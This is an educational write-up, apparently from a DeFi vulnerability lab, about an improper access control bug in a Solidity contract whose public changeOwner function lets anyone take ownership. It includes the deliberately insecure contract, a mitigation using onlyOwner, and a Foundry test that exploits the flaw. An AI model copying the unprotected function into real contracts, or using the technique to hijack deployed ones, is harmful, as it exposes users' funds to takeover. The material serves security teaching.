# Visibility
[Visibility.sol](https://github.com/SunWeb3Sec/DeFiVulnLabs/blob/main/src/test/Visibility.sol)  
**Name:** Improper Access Control Vulnerability

**Description:**  
The default visibility of the function is Public.
If there is an unsafe visibility setting, the attacker can directly call the sensitive function in the smart contract.

The ownerGame contract has a changeOwner function that is intended to change the owner of the contract.
However, due to improper access control, this function is publicly accessible and
can be called by any external account or contract. As a result, an attacker can call this function
to change the ownership of the contract and take control.

**Impact:** the owner of the contract can be changed by anyone.

**Mitigation:**  
Use access control modifiers: Solidity provides modifiers, such as onlyOwner,
which can be used to restrict the access of functions

**OwnerGame** **Contract:**  
```
contract ownerGame {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // wrong visibility of changeOwner function should be onlyOwner
    function changeOwner(address _new) public {
        owner = _new;
    }
}
```
****How to Test:****

forge test --contracts src/test/Visibility.sol-vvvv  
```
// This function tests the visibility of the functions in the ownerGameContract.
function testVisibility() public {
    // A new instance of the ownerGameContract is created.
    ownerGameContract = new ownerGame();

    // The current owner of the ownerGameContract is logged.
    console.log("Before exploiting, owner of ownerGame:", ownerGameContract.owner());

    // The changeOwner function of the ownerGameContract is called to change the owner to the sender of this function.
    ownerGameContract.changeOwner(msg.sender);

    // The new owner of the ownerGameContract is logged, which should now be the sender of this function.
    console.log("After exploiting, owner of ownerGame:", ownerGameContract.owner());

    // A message indicating the exploit is complete is logged.
    console.log("Exploit completed");
}
```
Red box: owne changed.
![Alt text](image-14.png)